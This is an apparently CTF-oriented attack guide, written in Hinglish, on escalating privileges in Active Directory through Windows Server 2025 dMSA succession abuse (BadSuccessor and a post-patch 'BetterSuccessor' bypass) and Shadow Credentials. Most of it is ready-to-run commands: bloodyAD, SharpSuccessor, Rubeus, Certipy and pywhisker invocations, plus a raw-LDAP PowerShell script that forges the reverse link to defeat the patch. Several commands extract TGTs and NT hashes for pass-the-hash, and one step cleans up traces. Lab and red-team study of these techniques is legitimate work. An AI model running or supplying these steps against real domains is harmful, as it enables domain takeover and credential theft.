1️⃣ dMSA aur Permission Primer

dMSA (Delegated Managed Service Account) Windows Server 2025 ka naya managed-service-account type hai jiska password AD khud rotate karta hai. Migration ke liye ek "succession" mechanism diya gaya hai jisse dMSA kisi purane account ki jagah le sakta hai — aur Kerberos ticket (PAC) mein us purane account ki groups bhi carry hoti hain.

In saare attacks ko samajhne ke liye ye 4 permissions/attributes yaad rakho:

Permission / AttributeKahan lagta haiKis kaam aata hai
CreateChildOU parUs OU ke andar naya dMSA object banane ke liye
msDS-ManagedAccountPrecededByLinkdMSA object par (forward link) "Main is predecessor account ka successor hoon" — dMSA khud set karta hai
msDS-SupersededManagedAccountLink /
msDS-SupersededManagedAccountState		 Predecessor account par (reverse link) Patch ke baad KDC ye bhi check karta hai ki predecessor ne bhi dMSA ko confirm kiya hai (mutual link)
msDS-KeyCredentialLinkKisi bhi account (user/computer/gMSA/dMSA) par Attacker-controlled "certificate key" add karne ke liye — Shadow Credentials ka core

Enumeration ke baad jo bhi permission milti hai, usi se decide hota hai konsa technique use hogi:

3️⃣ BadSuccessor PRE-PATCH ONLY

Ye original attack hai (discovered by Akamai researcher Yuval Gordon, May 2025). Idea simple hai: agar attacker kisi bhi OU mein naya dMSA bana sakta hai, to wo uska msDS-ManagedAccountPrecededByLink attribute seedha kisi bhi arbitrary account (chahe Domain Admin ho) ki taraf point kar sakta hai. Patch se pehle, KDC bina kisi reverse-check ke us link ko blindly trust kar leta tha.

⚠️ Kab identify hoga (pre-requisites)
  • Attacker ke paas kisi bhi OU par CreateChild right (dMSA object class allowed)
  • Target account par koi bhi permission zaroori nahi — ye sabse khatarnak point tha
  • Domain Controller abhi tak August-2025 patch (CVE-2025-53779) se patched na ho
  • Forest/domain schema dMSA feature support kare (Windows Server 2025 schema extension lagi ho)

🔍 Identification Commands

# Kisi OU par CreateChild right check (bloodyAD)
bloodyAD --host dc01.domain.local -d domain.local -u user -p pass get writable --otype OU

# PowerView se saari OUs par apni ACL check karo
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | `
  Where-Object { $_.ActiveDirectoryRights -match 'CreateChild' -and $_.SecurityIdentifier -eq (ConvertTo-SID (whoami)) }

# dsacls se manually ek OU check karo
dsacls "OU=Target,DC=domain,DC=local" | findstr /i "CREATE CHILD"

# Schema mein dMSA class exist karti hai ya nahi confirm karo
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=domain,DC=local" `
  -Filter "Name -eq 'ms-DS-Delegated-Managed-Service-Account'"

# Patch build check (26100.4946+ ya equivalent cumulative update = patched)
Get-HotFix | Sort-Object InstalledOn -Descending
systeminfo | findstr /i "OS Version"

💥 Exploitation (original PoC tool)

# Akamai ka original BadSuccessor.ps1 PowerShell script
Import-Module .\BadSuccessor.ps1
Invoke-BadSuccessor -Forest domain.local -DomainController dc01.domain.local `
  -Action Scan            # pehle scan karke exploitable OUs dhundo

Invoke-BadSuccessor -Forest domain.local -DomainController dc01.domain.local `
  -Action Exploit -Target "Domain Admins" -NewDMSA evil$

# Cleanup bhi zaroor karo (test environments mein) taaki dMSA object trace na chhode
Invoke-BadSuccessor -Action Cleanup -NewDMSA evil$

⚠️ Exact flag-names tool version ke hisaab se thode different ho sakte hain — hamesha -h / README check karo us specific release ka.

4️⃣ SharpSuccessor AUTOMATION TOOL

SharpSuccessor ek C# tool hai (by Logan Goins) jo BadSuccessor aur BetterSuccessor — dono scenarios ko automate kar deta hai. Ye khud check kar leta hai ki environment patched hai ya nahi, aur uske hisaab se sirf forward link set karega (unpatched) ya dono forward+reverse link set karega (patched, agar aapke paas target par GenericWrite bhi ho).

🧩 Kab use karein
  • Jab manually LDAP attributes set karna time-consuming lage — ek hi command mein poora kaam
  • Jab aapke paas .NET/C# binary chalane ki jagah ho (Windows shell chahiye, Rubeus jaise tools ke saath)
  • Patch-state pata na ho — tool khud detect karke सही approach choose karta hai

💥 Command

SharpSuccessor.exe add /impersonate:TARGET_ACCOUNT `
  /path:"OU=TargetOU,DC=domain,DC=local" `
  /account:ATTACKER_CONTROLLED_PRINCIPAL `
  /name:NewDmsaName

# Example:
SharpSuccessor.exe add /impersonate:svc_deploy `
  /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" `
  /account:ryan.brooks `
  /name:svc_backup

Agar environment patched hai aur SharpSuccessor ka version reverse-link automatically set nahi karta, to wahi manual LDAP trick use karo (next section mein BetterSuccessor ke andar diya gaya hai).

5️⃣ BetterSuccessor WORKS EVEN POST-PATCH

Microsoft ne August 2025 mein patch kiya: ab KDC check karta hai ki link dono taraf se match ho — dMSA se forward link, aur predecessor account se reverse link. Lekin patch sirf ye check karta hai ki reverse link exist karta hai, ye nahi ki kisne banaya. Isliye agar attacker ke paas predecessor account par bhi GenericWrite/GenericAll ho, to wo khud reverse link bana ke validation pass kara sakta hai.

✅ Kab identify hoga (pre-requisites)
  • CreateChild kisi OU par (naya dMSA banane ke liye)
  • Zaroori: GenericWrite ya GenericAll (ya kam se kam WriteProperty on msDS-SupersededManagedAccountLink + msDS-SupersededManagedAccountState) predecessor target account par
  • Patched ya unpatched — dono environments mein kaam karta hai

🔍 Identification Commands

# bloodyAD se ek hi command mein saari writable objects (OU + accounts) list karo
bloodyAD --host dc01.domain.local -d domain.local -u user -p pass get writable

# PowerView se specific target account par apni rights check karo
$acl = Get-Acl "AD:\CN=svc_target,OU=ServiceAccounts,DC=domain,DC=local"
$acl.Access | Where-Object {$_.IdentityReference -like "*myuser*"} | `
  Select IdentityReference,ActiveDirectoryRights

# dsacls se OU aur target account dono check karo
dsacls "OU=DMSAHolder,DC=domain,DC=local"
dsacls "CN=svc_target,OU=ServiceAccounts,DC=domain,DC=local"

💥 Exploitation — Option A: bloodyAD (ek hi command)

bloodyAD --host dc01.domain.local -d domain.local -u attacker -p pass -k add badSuccessor newdmsa \
  --ou "OU=TargetOU,DC=domain,DC=local" \
  -t "CN=TargetPredecessor,OU=ServiceAccounts,DC=domain,DC=local"
# Output mein seedha ek usable Kerberos ticket (EncodedKirbi) milta hai jo
# TargetPredecessor ki privileges carry karta hai

💥 Exploitation — Option B: Manual (SharpSuccessor + raw LDAP)

# Step 1: dMSA banao aur forward link set karo (SharpSuccessor)
SharpSuccessor.exe add /impersonate:svc_target /path:"OU=TargetOU,DC=domain,DC=local" `
  /account:attacker /name:evil_dmsa

# Step 2: Reverse link manually set karo predecessor account par (PowerShell, raw LDAP)
Add-Type -AssemblyName "System.DirectoryServices.Protocols"
$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("dc01.domain.local")
$ldap.AuthType = "Negotiate"; $ldap.Bind()
$dmsa   = "CN=evil_dmsa,OU=TargetOU,DC=domain,DC=local"
$target = "CN=svc_target,OU=ServiceAccounts,DC=domain,DC=local"
$mod = New-Object System.DirectoryServices.Protocols.ModifyRequest
$mod.DistinguishedName = $target
$m1 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$m1.Name = "msDS-SupersededManagedAccountLink"; $m1.Operation = "Replace"; $m1.Add($dmsa)
$m2 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$m2.Name = "msDS-SupersededManagedAccountState"; $m2.Operation = "Replace"; $m2.Add("2")
$mod.Modifications.Add($m1); $mod.Modifications.Add($m2)
$ldap.SendRequest($mod).ResultCode   # "Success" aana chahiye

# Step 3: dMSA ticket maango (predecessor ki privileges ke saath)
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe asktgs /targetuser:evil_dmsa$ /service:krbtgt/DOMAIN.LOCAL /opsec /dmsa /nowrap /ticket:<TGT>

Note: Raw LDAP (System.DirectoryServices.Protocols) isliye use kiya gaya kyunki Set-ADObject/$x.psbase.Invoke('Put',...) aksar "success" bolte hain lekin value actually stick nahi hoti in in-dMSA-specific attributes ke liye.

6️⃣ Shadow Credentials Attack INDEPENDENT OF dMSA

Ye dMSA se bilkul alag, lekin isi tarah ka ACL-abuse attack hai (originally Elad Shamir, 2021). Har AD object (user, computer, gMSA, dMSA bhi) ke paas ek attribute hota hai msDS-KeyCredentialLink, jisme certificate-based "public keys" store hoti hain jo PKINIT (certificate-based Kerberos pre-auth) ke liye use hoti hain. Agar attacker is attribute ko write kar sakta hai, to wo apni khud ki private key ka corresponding public key wahan add kar deta hai — aur fir us certificate se directly Kerberos TGT maang leta hai, bina target ka password jaane.

✅ Kab identify hoga (pre-requisites)
  • Target account (user/computer/gMSA/dMSA) par GenericWrite, GenericAll, ya kam se kam WriteProperty sirf msDS-KeyCredentialLink attribute par
  • Forest/domain schema Windows Server 2016+ wali ho (msDS-KeyCredentialLink attribute exist kare) — modern domains mein almost hamesha true hota hai
  • KDC PKINIT support kare (ye native Kerberos feature hai, AD CS (Certificate Services) install hona zaroori nahi — "Key Trust" mapping built-in hai Server 2016+ KDC mein)
  • Koi OU-level permission ki zaroorat nahi — ye attack seedha target object par hi kiya jaata hai

🔍 Identification Commands

# PowerView — ACL mein GenericWrite/GenericAll ya seedha msDS-KeyCredentialLink par rights dhundo
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | `
  Where-Object { $_.ObjectAceType -eq 'msDS-Key-Credential-Link' -or `
                 $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty' }

# bloodyAD se writable attributes dhundo
bloodyAD --host dc01.domain.local -d domain.local -u user -p pass get writable

# Certipy — automatically scan karta hai konse accounts shadow-cred ke liye vulnerable hain
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout

# pywhisker se bhi existing key-credentials list kar sakte ho (read access confirm karne ke liye)
python3 pywhisker.py -d domain.local -u user -p pass --target targetuser --action list

💥 Exploitation Commands

# Option A — Certipy (sabse aasaan, ek hi command: add + PKINIT + hash/ticket sab kar deta hai)
certipy shadow auto -u attacker@domain.local -p pass -account targetuser -dc-ip 10.10.10.10

# Option B — pywhisker (Linux/Python)
python3 pywhisker.py -d domain.local -u attacker -p pass --target targetuser --action add

# Option C — Whisker (Windows/.NET)
Whisker.exe add /target:targetuser

# Fir mile hue certificate (.pfx) se TGT maango (Rubeus)
Rubeus.exe asktgt /user:targetuser /certificate:<base64_pfx> /password:<pfx_password> `
  /getcredentials /show
# /getcredentials flag NT hash bhi nikal deta hai (U2U trick se) — seedha Pass-the-Hash ke liye ready

8️⃣ Checkpoint Box Ke Scenario Mein Kaunsa Fit Baithta Hai?

Humare Checkpoint walkthrough mein ryan.brooks ke paas do permissions thi:

  • CreateChild on OU=DMSAHolder
  • GenericWrite on CN=svc_deploy

Isse do valid attack paths khulte hain:

PathKya miltaKyun BetterSuccessor behtar tha is case mein
BetterSuccessor (jo humne use kiya)svc_deploy ki saari group memberships (PAC merge) + bonus mein uska RC4/NTLM hash bhi ticket ke andar leak ho gaya Reliable, purely Kerberos-based (koi certificate/PKINIT dependency nahi), aur ek hi command (bloodyAD add badSuccessor) mein pura kaam ho gaya
Shadow Credentials (alternative, agar try karte)svc_deploy ka TGT seedha PKINIT certificate se Bhi kaam karta, lekin extra dependency: domain mein PKINIT properly enabled hona chahiye, aur target ki existing msDS-KeyCredentialLink ko overwrite karne se account lockout/alert trigger ho sakta hai agar legit cert pehle se set ho

Conclusion: Dono technically valid the, lekin BetterSuccessor ko select kiya gaya kyunki box ka naming (DMSAHolder OU) aur dMSA-specific permissions explicitly isi path ki taraf point kar rahe the, aur BetterSuccessor zero extra dependency ke saath (bina PKINIT/certificate infra ki chinta kiye) seedha kaam kar gaya.
